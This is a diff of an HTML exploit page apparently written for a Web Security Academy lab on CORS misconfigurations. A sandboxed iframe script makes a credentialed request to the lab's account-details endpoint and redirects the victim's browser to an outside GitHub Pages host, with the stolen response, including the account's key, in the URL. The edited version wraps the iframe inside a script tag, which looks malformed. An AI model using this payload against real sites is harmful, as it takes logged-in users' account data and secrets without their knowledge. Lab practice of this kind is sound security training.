@@ -1,12 +1,23 @@
+<!DOCTYPE html>
 <html>
-<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+<!--BY MENDELEEANO1907 -->
+<title>cors-2</title>
+     <body>
+         <h2>CORS misconfigurations</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">GO!</button>
+         </div>
+         <script>
+             <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-req.open('get','https://0ab8003c0459a6068f2cda9e0078009b.web-security-academy.net/accountDetails',true);
+req.open('get','https://0af70042046e50e2811b8ec000c200f8.web-security-academy.net/accountDetails',true);
 req.withCredentials = true;
 req.send();
 function reqListener() {
 location='https://verdecard2023.github.io/mendeleeano.github.io?key='+encodeURIComponent(this.responseText);
 };
 </script>"></iframe>
-</html>
+         </script>
+     </body>
+ </html>
